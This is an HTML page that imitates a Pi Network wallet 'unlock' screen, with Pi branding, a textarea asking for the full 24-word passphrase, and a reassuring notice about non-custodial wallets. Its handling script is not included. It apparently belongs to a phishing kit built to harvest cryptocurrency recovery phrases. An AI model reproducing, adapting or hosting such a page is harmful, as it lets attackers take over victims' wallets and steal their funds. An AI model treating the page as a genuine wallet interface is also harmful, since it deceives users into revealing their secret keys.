<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Network</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Main Transparent Interface -->
    <div class="container">
        
        <!-- Pi Network Logo Inside Transparent Box -->
        <img src="Pi-Network.png" alt="Pi Network Logo" class="logo">
        
        <h2>Unlock Pi Wallet</h2>
        
        <!-- Passphrase Input -->
        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>

        <!-- Unlock Button -->
        <button id="unlockBtn">Unlock with Passphrase</button>

        <!-- Display Message -->
        <p id="message"></p>

        <!-- Important Notice with Highlight -->
        <p class="notice">
            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.  
            Recovery of the passphrase is currently impossible.  
            <br><br>
            Lost your passphrase?  
            <span class="highlight">You can create a new wallet.</span>  
            But all your previous funds will be inaccessible.
        </p>
    </div>

    <script src="script.js"></script>

</body>
</html>
